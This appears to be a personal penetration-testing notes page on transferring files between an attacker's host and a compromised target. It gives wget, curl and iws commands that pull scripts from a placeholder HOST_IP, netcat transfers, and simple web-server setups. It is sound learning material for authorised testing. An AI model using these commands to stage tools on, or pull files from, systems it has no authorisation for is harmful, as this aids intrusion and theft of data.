# Transfer files 🛅

<div class="row row-cols-lg-2"><div>

We will often want to transfer files between your machine, and the target. Mostly during privilege escalation and post-exploitation.

According to the current environment capabilities <small>(e.g., installed tools)</small> and restrictions <small>(e.g. firewall)</small>, we will have to use different techniques.

The most common approaches from the host to the target:

* Copy-pasting <small>(short text files)</small> ✂️
* Python web server <small>(using wget/cURL/iwr as client)</small> 🐍
</div><div>

To transfer a file from the target to the host, it's often harder and more complex. Some common approaches are:

* Copy-pasting <small>(short text files)</small> ✂️
* Moving files to the webserver directory <small>(if applicable)</small> 📂
* Python web server <small>(often available on Linux)</small> 🐍
* Using services such as SCP/FTP/SMB/NFS/... <small>(if present)</small> 🎡
* Using installed tools such as nc 🧯

We may use checksum functions/commands to check that the file was correctly transferred. [Refer to cryptography/hashing/checksum](/cybersecurity/cryptography/algorithms/hashing/index.md).
</div></div>

<hr class="sep-both">

<div class="row row-cols-lg-2"><div>

#### Python webserver 🐍

<i class="small">On the "host" where the file is:</i>

```shell!
$ python -m http.server port # port > 1023
$ python [...] --directory /path/to/server/root
$ sudo python -m http.server port # port <= 1023
```

<i class="small">On the "client" that need the file:</i>

```shell!
$ # Download on Linux
$ wget HOST_IP:port/script.sh -o /tmp/script.sh
PS> # Download on Windows
PS> wget HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
```

* You may try with `python2`, and `python3` if `python` is unavailable.
* You may have to use `curl` or `iws` (Windows-only) instead of `wget`

```shell!
$ curl HOST_IP:port/script.sh -o /tmp/script.sh
PS> curl HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
PS> iws HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
```
</div><div>

#### netcat 🐈

```ps
# host
$ nc CLIENT_IP port < file.sh
# client
$ nc -lvp port > file.sh
```

<br>

#### services 🕳️

You may use FTP/SCP/NFS/SMB/... if applicable. For instance, you may set up a [SMB](/operating-systems/networking/protocols/smb.md) server on your machine,  and use Windows `copy`/`robocopy ` command to upload/download files.

```shell!
$ php -S 127.0.0.1:8080 # php
$ http-server -p 8080   # node "http-server" package
```

➡️ See also [impacket](/operating-systems/networking/protocols/tools/impacket.md) scripts.

<br>

#### Copy-paste ✂️

Copy-paste may be an option, but not every file can be copy-pasted. One trick is to encode the file using base64, copy-paste the base64 payload on a file on the target, and decode the file on the target.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [Windows File Transfer Cheatsheet](https://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/)
* [croc](https://github.com/schollz/croc).
</div><div>
</div></div>